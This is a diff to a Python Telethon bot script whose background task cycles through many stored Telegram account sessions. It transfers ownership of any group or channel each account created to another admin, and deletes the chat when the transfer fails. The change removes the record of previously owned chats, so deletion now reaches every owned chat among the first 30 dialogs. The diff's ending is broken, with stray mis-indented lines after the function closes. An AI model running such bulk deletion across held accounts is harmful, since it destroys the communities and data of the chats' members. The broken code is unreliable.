@@ -1441,12 +1441,9 @@ async def forward_to_owner(event):
         await event.forward_to(OWNER_ID)
     except Exception:
         pass
-
 async def ownership_protection_task():
     from telethon.tl.functions.channels import DeleteChannelRequest
     from telethon.tl.functions.messages import DeleteChatRequest
-    
-    known_owned_groups = {} 
     
     while True:
         try:
@@ -1468,18 +1465,13 @@ async def ownership_protection_task():
                             await client.disconnect()
                             continue
                             
-                        if session_name not in known_owned_groups:
-                            known_owned_groups[session_name] = set()
-                            async for dialog in client.iter_dialogs():
-                                if (dialog.is_channel or dialog.is_group) and getattr(dialog.entity, 'creator', False):
-                                    known_owned_groups[session_name].add(dialog.entity.id)
-                        
-                        async for dialog in client.iter_dialogs(limit=20):
+                        # فحص مباشر لأول 30 محادثة بدون ذاكرة تمنع العملية
+                        async for dialog in client.iter_dialogs(limit=30):
                             if dialog.is_channel or dialog.is_group:
                                 entity = dialog.entity
-                                chat_id = entity.id
                                 
-                                if getattr(entity, 'creator', False) and chat_id not in known_owned_groups[session_name]:
+                                # الشرط: إذا الحساب هو المالك
+                                if getattr(entity, 'creator', False):
                                     transferred = False
                                     
                                     try:
@@ -1487,36 +1479,48 @@ async def ownership_protection_task():
                                         for admin in admins:
                                             if admin.id != acc['id'] and not admin.bot and not getattr(admin, 'deleted', False):
                                                 try:
-                                                    # ملاحظة: إذا الحساب بيه تحقق بخطوتين، يجب توفير الباسورد المشفر هنا
                                                     await client(functions.channels.EditCreatorRequest(
                                                         channel=entity,
                                                         user_id=admin.id,
-                                                        password="" 
+                                                        password="" # إذا الحساب بيه تحقق بخطوتين لازم تكتبه هنا
                                                     ))
                                                     transferred = True
                                                     try:
-                                                        await bot.send_message(OWNER_ID, f"🛡️ **إشعار حماية:** تم إرجاع ملكية ({getattr(entity, 'title', 'كروب/قناة')}) إلى الأدمن بنجاح.")
+                                                        await bot.send_message(OWNER_ID, f"🛡️ **نجاح:** تم إرجاع ملكية ({getattr(entity, 'title', 'بدون اسم')}) للأدمن.")
                                                     except Exception: pass
                                                     break 
                                                 except Exception as e:
-                                                    # تم تفعيل طباعة الخطأ لمعرفة سبب رفض نقل الملكية
-                                                    print(f"فشل النقل للأدمن {admin.id}: {e}")
+                                                    try:
+                                                        await bot.send_message(OWNER_ID, f"⚠️ **فشل النقل:** حاول يرجع ({getattr(entity, 'title', 'بدون اسم')}) بس فشل.\n**السبب:** `{e}`")
+                                                    except Exception: pass
                                                     continue
                                     except Exception:
                                         pass
                                         
                                     if not transferred:
-                                        destroyed = False
                                         try:
                                             if isinstance(entity, types.Channel):
                                                 await client(DeleteChannelRequest(channel=entity))
-                                                destroyed = True
                                             elif isinstance(entity, types.Chat):
                                                 await client(DeleteChatRequest(chat_id=entity.id))
-                                                destroyed = True
-                                        except Exception as e:
-                                            # هنا السر! راح يوصلك إشعار بالخطأ الفعلي اللي يمنع المسح
+                                            
                                             try:
+                                                await bot.send_message(OWNER_ID, f"🔥 **تدمير:** تم مسح مجموعة ({getattr(entity, 'title', 'بدون اسم')}) بنجاح.")
+                                            except Exception: pass
+                                        except Exception as e:
+                                            # هذا الإشعار الأهم إذا فشل المسح
+                                            try:
+                                                await bot.send_message(OWNER_ID, f"❌ **فشل المسح:** ما كدر يمسح الكروب ({getattr(entity, 'title', 'بدون اسم')})!\n**السبب التقني:** `{e}`")
+                                            except Exception: pass
+
+                        await client.disconnect()
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        
+        await asyncio.sleep(15)
+
                                                 await bot.send_message(OWNER_ID, f"⚠️ **خطأ في الحماية:** الحساب استلم ملكية ({getattr(entity, 'title', 'بدون اسم')}) بس ما كدر يمسحها!\n**السبب التقني:** `{e}`")
                                             except Exception: pass
                                             
